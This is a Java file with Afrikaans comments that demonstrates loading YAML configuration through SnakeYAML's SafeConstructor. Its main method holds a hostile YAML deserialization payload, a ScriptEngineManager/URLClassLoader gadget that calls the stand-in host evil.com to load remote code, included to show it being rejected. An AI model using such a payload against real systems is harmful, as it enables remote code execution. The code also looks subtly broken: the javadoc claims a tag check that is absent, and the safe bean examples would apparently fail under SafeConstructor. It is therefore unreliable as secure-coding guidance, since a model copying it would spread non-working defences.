import org.yaml.snakeyaml.Yaml;
import org.yaml.snakeyaml.constructor.Constructor;
import org.yaml.snakeyaml.constructor.SafeConstructor;

public class ClassX {

    // 'n Voorbeeldklas om die konfigurasie te verteenwoordig
    // Hierdie klas sal die struktuur van jou YAML-lêer weerspieël.
    public static class MyConfig {
        private String setting1;
        private int setting2;
        // Voeg meer velde by soos benodig

        public String getSetting1() {
            return setting1;
        }

        public void setSetting1(String setting1) {
            this.setting1 = setting1;
        }

        public int getSetting2() {
            return setting2;
        }

        public void setSetting2(int setting2) {
            this.setting2 = setting2;
        }

        @Override
        public String toString() {
            return "MyConfig{" +
                   "setting1='" + setting1 + '\'' +
                   ", setting2=" + setting2 +
                   '}';
        }
    }

    /**
     * Laai konfigurasie vanaf 'n YAML-string.
     * 
     * Die funksie kontroleer vir die eksplisiete gevaarlike etikette om objekinstansie te voorkom.
     * Dit gebruik 'n {@link SafeConstructor} om slegs veilige Java-tipes soos String, Integer, List, Map, ens. toe te laat,
     * en verhoed die deserialisering van arbitrêre Java-objekte wat sekuriteitskwessies kan veroorsaak.
     *
     * @param yamlString Die YAML-inhoud as 'n string.
     * @param type Die klas van die objek waarin die YAML-data gelaai moet word.
     * @param <T> Die tipe van die konfigurasie-objek.
     * @return 'n Objek van die gespesifiseerde tipe wat die gelaaide konfigurasie bevat, of null as die string leeg is.
     * @throws org.yaml.snakeyaml.error.YAMLException As daar 'n fout is tydens die parsing of konstruksie van die YAML.
     */
    public static <T> T loadConfigFromString(String yamlString, Class<T> type) {
        if (yamlString == null || yamlString.trim().isEmpty()) {
            return null;
        }
        // Gebruik SafeConstructor om slegs veilige tipes toe te laat
        Yaml yaml = new Yaml(new SafeConstructor());
        return yaml.loadAs(yamlString, type);
    }

    // Voorbeeld van hoe om die funksie te gebruik
    public static void main(String[] args) {
        String safeYaml = "setting1: \"Hello World\"\nsetting2: 123";
        String dangerousYaml = "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://evil.com/\"]]]]";
        String anotherSafeYaml = "setting1: 'Another value'\nsetting2: 456";


        System.out.println("Laai veilige YAML:");
        try {
            MyConfig config1 = loadConfigFromString(safeYaml, MyConfig.class);
            System.out.println("Gelaaide konfigurasie: " + config1);
        } catch (Exception e) {
            System.err.println("Fout tydens laai van veilige YAML: " + e.getMessage());
        }

        System.out.println("\nProbeer om gevaarlike YAML te laai (moet 'n fout gee):");
        try {
            // Hierdie sal 'n YAMLException gooi as gevolg van die gebruik van SafeConstructor
            // wat die eksplisiete tag !!javax.script.ScriptEngineManager nie toelaat nie.
            Object dangerousObject = loadConfigFromString(dangerousYaml, Object.class);
            System.out.println("Gevaarlike konfigurasie gelaai (ONVERWAGS): " + dangerousObject);
        } catch (org.yaml.snakeyaml.error.YAMLException e) {
            System.err.println("Fout tydens laai van gevaarlike YAML (VERWAG): " + e.getMessage());
        } catch (Exception e) {
            System.err.println("Ander fout tydens laai van gevaarlike YAML: " + e.getMessage());
        }

        System.out.println("\nLaai nog 'n veilige YAML:");
        try {
            MyConfig config2 = loadConfigFromString(anotherSafeYaml, MyConfig.class);
            System.out.println("Gelaaide konfigurasie: " + config2);
        } catch (Exception e) {
            System.err.println("Fout tydens laai van veilige YAML: " + e.getMessage());
        }
    }
}
